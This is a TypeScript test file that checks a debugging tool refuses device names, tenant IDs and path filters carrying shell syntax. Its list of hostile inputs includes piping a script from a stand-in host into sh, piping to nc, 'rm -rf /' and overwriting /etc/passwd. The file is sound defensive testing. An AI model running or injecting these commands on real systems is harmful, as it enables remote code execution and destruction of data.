// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Correlix

// pipelineDebugger.model.test.ts — the command line this screen offers a person
// to paste into a terminal.
//
// The rule under test is one rule: a value that came off the wire never becomes
// shell syntax. A discovered device names itself through sysName, and no layer
// between the device and this line checks its characters, so the check has to
// live here and it has to REFUSE rather than quote — a quoted line would have
// to be correct for whichever shell the operator is in, and we do not know it.

import { describe, it, expect } from "vitest";
import { isShellSafeArg, traceCommand } from "./pipelineDebugger.model";

describe("the trace command line", () => {
  it("builds the line for an ordinary device name", () => {
    const r = traceCommand({ kind: "syslog", device: "leaf1", tenant: "acme", ttlSeconds: 60 });
    expect(r.refused).toBe("");
    expect(r.command).toBe("correlix-debug trace --kind syslog --device leaf1 --tenant acme --ttl 60s");
  });

  it("still shows the shape of the line before a device is chosen", () => {
    const r = traceCommand({ kind: "syslog", device: "", ttlSeconds: 60 });
    expect(r.refused).toBe("");
    expect(r.command).toBe("correlix-debug trace --kind syslog --device <device> --ttl 60s");
  });

  // The injection itself. Every one of these is a name a device can report, and
  // every one of them would run something if the line were pasted.
  const hostile: [string, string][] = [
    ["command chained with a semicolon", "core1; curl http://evil.example/x.sh|sh"],
    ["command substitution", "core1$(id)"],
    ["backtick substitution", "core1`id`"],
    ["a pipe", "core1|nc evil.example 9001"],
    ["a background chain", "core1 && rm -rf /"],
    ["a redirect", "core1 > /etc/passwd"],
    ["a newline carrying a second line", "core1\nrm -rf /"],
    ["a quote that would close ours", "core1'; rm -rf /; echo '"],
    ["a double quote", 'core1"; rm -rf /; echo "'],
    ["a glob", "core1*"],
    ["a variable", "core1$HOME"],
    ["a plain space", "core1 rm"],
  ];

  it.each(hostile)("refuses a device name with %s", (_label, name) => {
    const r = traceCommand({ kind: "syslog", device: name, ttlSeconds: 60 });
    expect(r.command).toBe("");
    expect(r.refused).toMatch(/carries characters a terminal would read as instructions/);
    expect(r.refused).toContain("device name");
  });

  it("refuses on the tenant and the path filter too, and names which one", () => {
    expect(traceCommand({ kind: "syslog", device: "leaf1", tenant: "acme;id" }).refused).toContain("tenant");
    const p = traceCommand({ kind: "gnmi", device: "leaf1", passive: true, path: "/interfaces;id" });
    expect(p.command).toBe("");
    expect(p.refused).toContain("path filter");
  });

  it("accepts the punctuation real names, tenant ids and gNMI paths carry", () => {
    for (const ok of ["core1", "core-1", "core_1", "core.example.net", "10.0.0.1", "fe80::1", "acme@lab", "/interfaces/interface[name=eth0]/state"]) {
      expect(isShellSafeArg(ok)).toBe(true);
    }
  });

  it("rejects every character a shell reads as syntax", () => {
    for (const bad of [";", "|", "&", "$", "`", "(", ")", "<", ">", "'", '"', "\\", "*", "?", "{", "}", "!", "#", "~", "\n", "\t", " "]) {
      expect(isShellSafeArg(`core1${bad}`)).toBe(false);
    }
  });
});
